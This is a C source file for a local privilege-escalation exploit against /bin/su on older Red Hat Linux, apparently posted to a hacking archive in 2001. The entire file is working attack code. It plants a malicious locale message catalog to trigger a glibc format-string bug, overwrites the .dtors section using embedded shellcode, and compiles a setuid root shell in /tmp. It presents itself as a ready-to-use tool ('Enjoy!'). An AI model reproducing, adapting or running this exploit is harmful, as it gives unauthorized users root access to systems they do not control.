/* su.c by xp, modified by logikal@efnet - tested on redhat 5 -> 7 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <getopt.h>
#include <dirent.h>

char *shellcode =
"\x31\xc0\x83\xc0\x17\x31\xdb\xcd\x80\xeb"
"\x30\x5f\x31\xc9\x88\x4f\x17\x88\x4f\x1a"
"\x8d\x5f\x10\x89\x1f\x8d\x47\x18\x89\x47"
"\x04\x8d\x47\x1b\x89\x47\x08\x31\xc0\x89"
"\x47\x0c\x8d\x0f\x8d\x57\x0c\x83\xc0\x0b"
"\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
"\xcb\xff\xff\xff\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x2f\x62\x69\x6e\x2f\x73\x68\x30\x2d\x63"
"\x30"
"chown root /tmp/xp;chmod 4777 /tmp/xp";

char *LC_MESSAGES = "/tmp/LC_MESSAGES";
int NOP_LEN = 12000;

char *msgfmt = "/usr/bin/msgfmt";
char *objdump = "/usr/bin/objdump";
char *language = NULL;

char *make_format_string(unsigned long, int, int);
unsigned long get_dtors_addr();
char *make_ret_str(unsigned long, int);
void calculate_eat_space(int *, int *);
void checkfor(char*);
void make_suid_shell();
void search_valid_language();

int main(int argc, char **argv)
{
  char execbuf[1024];
  unsigned long dtors_addr = 0xAABBCCDD;
  unsigned long sh_addr = 0xBFFFFFFF;
  FILE *f;
  char *env[3];
  char *args[6];
  int eat = 0, pad = 0, fd;
  char *nop_env;
  int offset = 5000;
  struct stat st;
  int pid, c;
  char randfile[1024];
  char *args2[2], opt;

  printf("su exploit by XP <xp@xtreme-power.com>\n");
  printf("Enjoy!\n\n");

  while ((opt = getopt(argc, argv, "o:n:m:O:e:l:")) != EOF)
    switch(opt) {
    case 'o':
      offset = atoi(optarg);
      break;
    case 'n':
      NOP_LEN = atoi(optarg);
      break;
    case 'm':
      msgfmt = strdup(optarg);
      break;
    case 'O':
      objdump = strdup(optarg);
      break;
    case 'e':
      sscanf(optarg, "%i:%i", &eat, &pad);
      break;
    case 'l':
      language = (char*) malloc(40 + strlen(optarg));
      if (!language) {
printf("malloc failed\naborting\n");
exit(0);
      }
      memset(language, 0, 40 + strlen(optarg));
      sprintf(language, "LANGUAGE=%s/../../../../../../tmp", optarg);
      break;
    default:
      exit(0);
    }

  printf("Phase 1. Checking paths and write permisions\n");
  printf(" Checking for %s...", msgfmt);
  checkfor(msgfmt);
  printf(" Checking for %s...", objdump);
  checkfor(objdump);

  printf(" Checking write permisions on /tmp...");
  if (stat("/tmp", &st) < 0) {
    printf("failed. cannot stat /tmp\naborting\n");
    exit(0);
  }

  if (!(st.st_mode & S_IWOTH)) {
    printf("failed. /tmp it's not +w\naborting\n");
    exit(0);
  }
  printf("Ok\n");
  fflush(stdout);

  printf(" Checking read permisions on /bin/su...");
  if (stat("/bin/su", &st) < 0) {
    printf("failed. cannot stat /bin/su\naborting\n");
    exit(0);
  }

  if (!(st.st_mode & S_IROTH)) {
    printf("failed. /bin/su it's not +r\naborting\n");
    exit(0);
  }
  printf("Ok\n");
  fflush(stdout);

  if (!language) {
    printf(" Checking for a valid language...");
    search_valid_language();
    printf("Ok\n");
  }

  printf(" Checking that %s does not exist...", LC_MESSAGES);
  if (stat(LC_MESSAGES, &st) >= 0) {
    printf("failed. %s exists\naborting\n", LC_MESSAGES);
    exit(0);
  }
  printf("Ok\n");
  fflush(stdout);

  printf("Phase 2. Calculating eat and pad values\n ");
  srand(time(NULL));

  if (eat || pad) printf("skkiping, values set by user to eat = %i and
pad = %i\n", eat, pad);
  else {
    calculate_eat_space(&eat, &pad);
    printf("done\n eat = %i and pad = %i\n", eat, pad);
  }
  fflush(stdout);

  sh_addr -= offset;

  printf("Phase 3. Creating evil libc.mo and setting enviroment
vars\n");
  fflush(stdout);

  mkdir(LC_MESSAGES, 0755);
  chdir(LC_MESSAGES);

  f = fopen("libc.po", "w+");
  if (!f) {
    perror("fopen()");
    exit(0);
  }
  fprintf(f,"msgid \"%%s: invalid option -- %%c\\n\"\n");
  fprintf(f,"msgstr \"%s\\n\"", make_format_string(sh_addr, eat, 0));
  fclose(f);

  sprintf(execbuf, "%s libc.po -o libc.mo; chmod 777 libc.mo", msgfmt);
  system(execbuf);

  nop_env = (char*) malloc(NOP_LEN + strlen(shellcode) + 1);
  if (!nop_env) {
    printf("malloc failed\naborting\n");
    exit(0);
  }
  memset(nop_env, 0x90, NOP_LEN + strlen(shellcode) + 1);
  sprintf(&nop_env[NOP_LEN], "%s", shellcode);

  env[0] = language;
  env[1] = NULL;

  printf("Phase 4. Getting address of .dtors section of /bin/su\n ");
  dtors_addr = get_dtors_addr();
  printf("done\n .dtors is at 0x%08x\n", dtors_addr);
  fflush(stdout);

  printf("Phase 5. Compiling suid shell\n");
  fflush(stdout);

  make_suid_shell();

  printf("Phase 6. Executing /bin/su\n");
  fflush(stdout);

  args[0] = "/bin/su";
  args[1] = "-";
  args[2] = make_ret_str(dtors_addr, pad);
  args[3] = "-w";
  args[4] = nop_env;
  args[5] = NULL;

  sprintf(randfile, "/tmp/tmprand%i", rand());

  if (!(pid = fork())) {
    close(1);
    close(2);
    fd = open(randfile, O_CREAT | O_RDWR);
    dup2(fd, 1);
    dup2(fd, 2);
    execve(args[0], args, env);
    printf("failed to exec /bin/su\n"); exit(0);
  }

  if (pid < 0) {
    perror("fork()");
    exit(0);
  }

  waitpid(pid, &c, 0);

  unlink(randfile);

  stat("/tmp/xp", &st);
  if (!(S_ISUID & st.st_mode)) {
    printf("failed to put mode 4777 to /tmp/xp\naborting\n");
    exit(0);
  }

  printf(" - Entering rootshell ;-) -\n");
  fflush(stdout);

  if (!(pid = fork())) {
    args2[0] = "/tmp/xp";
    args2[1] = NULL;
    execve(args2[0], args2, NULL);
    printf("failed to exec /tmp/xp\n");
    exit(0);
  }

  if (pid < 0) {
    perror("fork()");
    exit(0);
  }

  waitpid(pid, &c, 0);

  printf("Phase 7. Cleaning enviroment\n");
  sprintf(execbuf, "rm -rf %s /tmp/xp", LC_MESSAGES);
  system(execbuf);
}

char ret_make_format[0xffff];

char *make_format_string(unsigned long sh_addr, int eat, int test)
{
  char *ret = ret_make_format;
  int c, waste;
  int hi, lo;

  memset(ret, 0, 0xffff);

  for (c = 0; c < eat; c++) strcat(ret, "%8x");

  waste = 8 * eat;

  hi = (sh_addr & 0xffff0000) >> 16;
  lo = (sh_addr & 0xffff) - hi;
  if (!test) {
    sprintf(&ret[strlen(ret)], "%%0%ux%%hn", hi-waste);
    sprintf(&ret[strlen(ret)], "%%0%ux%%hn", lo);
  }
  else strcat(ret, "%8x *0x%08x* %8x *0x%08x*");
  return ret;
}

unsigned long get_dtors_addr()
{
  char exec_buf[1024];
  char file[128];
  char buf[1024], sect[1024];
  FILE *f;
  unsigned long ret = 0, tmp1, tmp2, tmp3;

  sprintf(file, "/tmp/tmprand%i", rand());
  sprintf(exec_buf, "%s -h /bin/su > %s", objdump, file);

  system(exec_buf);

  f = fopen(file, "r");
  if (!f) {
    perror("fopen()");
    exit(0);
  }

  while (!feof(f)) {
    fgets(buf, 1024, f);
    sscanf(buf, " %i .%s %x %x \n", &tmp1, sect, &tmp2, &tmp3);
    printf("."); fflush(stdout);
    if (strcmp(sect, "dtors")) continue;
    ret = tmp3;
    break;
  }

  unlink(file);

  if (!ret) {
    printf("error getting the address of .dtors\naborting");
    exit(0);
  }

  return ret+4;
}

char ret_make_ret_str[0xffff];

char *make_ret_str(unsigned long dtors_addr, int pad)
{
  char *ret = ret_make_ret_str, *ptr2;
  unsigned long *ptr = (unsigned long*) ret;
  int c;

  memset(ret, 0, 0xffff);

  *ptr = dtors_addr+2;
  *(ptr+1) = 0xAABBCCDD;
  *(ptr+2) = dtors_addr;

  ptr2 = &ret[strlen(ret)];
  while (pad--)
    *(ptr2++) = 0xaa;

  return ret;
}

void calculate_eat_space(int *eatr, int *padr)
{
  int eat = 0, pad = 0;
  char tmpfile[128];
  FILE *f;
  char execbuf[1024];
  int fds[2], tmpfd;
  unsigned long test_value = 0xAABBCCDD;
  char *nop_env;
  char *env[2];
  char *args[6];
  char buf[1024];
  int l, pid;
  struct stat st;
  char *readbuf = NULL, *token;
  unsigned long t1, t2;

  tmpfile[0] = '\0';

  nop_env = (char*) malloc(NOP_LEN + strlen(shellcode) + 1);
  if (!nop_env) {
    printf("malloc failed\naborting\n");
    exit(0);
  }
  memset(nop_env, 0x90, NOP_LEN + strlen(shellcode) + 1);
  sprintf(&nop_env[NOP_LEN], "%s", shellcode);

  for (eat = 50; eat < 200; eat++) {
    for (pad = 0; pad < 4; pad++) {

      if (tmpfile[0]) unlink(tmpfile);

      chdir("/");

      sprintf(execbuf, "rm -rf %s", LC_MESSAGES);
      system(execbuf);

      mkdir(LC_MESSAGES, 0755);
      chdir(LC_MESSAGES);

      f = fopen("libc.po", "w+");
      if (!f) {
perror("fopen()");
exit(0);
      }

      fprintf(f,"msgid \"%%s: invalid option -- %%c\\n\"\n");
      fprintf(f,"msgstr \"%s\\n\"", make_format_string(0xbfffffbb, eat,
1));
      fclose(f);

      sprintf(execbuf, "chmod 777 libc.po; %s libc.po -o libc.mo",
msgfmt);
      system(execbuf);

      pipe(&fds);

      if (!(pid = fork())) {

close(fds[0]);
close(1);
close(2);

dup2(fds[1], 1);
dup2(fds[1], 2);

env[0] = language;
env[1] = NULL;

args[0] = "/bin/su";
args[1] = "-";
args[2] = make_ret_str(test_value, pad);
args[3] = "-w";
args[4] = nop_env;
args[5] = NULL;

execve(args[0], args, env);
      }

      if (pid < 0) {
perror("fork()");
exit(0);
      }

      close(fds[1]);

      sprintf(tmpfile, "/tmp/tmprand%i", rand());
      tmpfd = open(tmpfile, O_RDWR | O_CREAT);
      if (tmpfd < 0) {
perror("open()");
exit(0);
      }
      while ((l = read(fds[0], buf, 1024)) > 0)
write(tmpfd, buf, l);
      close(tmpfd);

      waitpid(pid, &l, 0);

      stat(tmpfile, &st);

      chmod(tmpfile, 0777);

      f = fopen(tmpfile, "r");
      if (!f) {
perror("fopen()");
exit(0);
      }

      if (readbuf) free(readbuf);
      readbuf = (char*) malloc(st.st_size);
      if (!readbuf) {
printf("malloc failed\naborting\n");
exit(0);
      }

      memset(readbuf, 0, st.st_size);

      fread(readbuf, 1, st.st_size, f);
      fclose(f);

      token = strtok(readbuf, "*");
      if (!token) continue;
      token = strtok(NULL, "*");
      if (!token) continue;

      t1 = strtoul(token, NULL, 16);
      token = strtok(NULL, "*");
      if (!token) continue;
      token = strtok(NULL, "*");
      if (!token) continue;
      t2 = strtoul(token, NULL, 16);

      if (t2 == test_value)
if (t1 == (test_value+2)) {
  *eatr = eat;
  *padr = pad;
  sprintf(execbuf, "rm -rf %s", LC_MESSAGES);
  system(execbuf);
  if (tmpfile[0]) unlink(tmpfile);
  return;
}

      // sleep(10);
    }
    printf(".");
    fflush(stdout);
  }

  if (tmpfile[0]) unlink(tmpfile);
  sprintf(execbuf, "rm -rf %s", LC_MESSAGES);
  system(execbuf);

  printf("failed to calculate eat and pad values. glibc patched or
invalid language?\naborting\n");
  exit(0);
}

void checkfor(char *p)
{
  int fd;
  fd = open(p, O_RDONLY);
  if (fd < 0) {
    printf("failed\naborting\n");
    exit(0);
  }
  close(fd);
  printf("Ok\n");
  fflush(stdout);
}

void make_suid_shell()
{
  FILE *f;
  char execbuf[1024];

  f = fopen("/tmp/kidd0.c", "w");
  if (!f) {
    printf(" failed to create /tmp/kidd0.c\naborting\n");
    exit(0);
  }

  fprintf(f, "int main() { setuid(0); setgid(0); system(\"/bin/sh\");
}");
  fclose(f);

  sprintf(execbuf, "gcc /tmp/kidd0.c -o /tmp/xp");
  system(execbuf);

  sprintf(execbuf, "rm -f /tmp/kidd0.c");
  system(execbuf);

  f = fopen("/tmp/xp", "r");
  if (!f) {
    printf(" failed to compile /tmp/kidd0.c\naborting\n");
    exit(0);
  }
  fclose(f);

  printf(" /tmp/xp created Ok\n");
  fflush(stdout);
}

void search_valid_language()
{
  DIR *locale;
  struct dirent *dentry;

  locale = opendir("/usr/share/locale");
  if (!locale) {
    perror("failed to opendir /usr/share/locale");
    printf("aborting\n");
    exit(0);
  }

  while (dentry = readdir(locale)) {

    if (!strchr(dentry->d_name, '_')) continue;

    language = (char*) malloc(40 + strlen(dentry->d_name));
    if (!language) {
      printf("malloc failed\naborting\n");
      exit(0);
    }
    memset(language, 0, 40 + strlen(dentry->d_name));
    sprintf(language, "LANGUAGE=%s/../../../../../../tmp",dentry->d_name);
    closedir(locale);
    printf(" [using %s] ", dentry->d_name);
    return;
  }

  printf("failed to find a valid language\naborting\n");
  exit(0);
}
/*                   www.hack.co.za  [15 January 2001]*/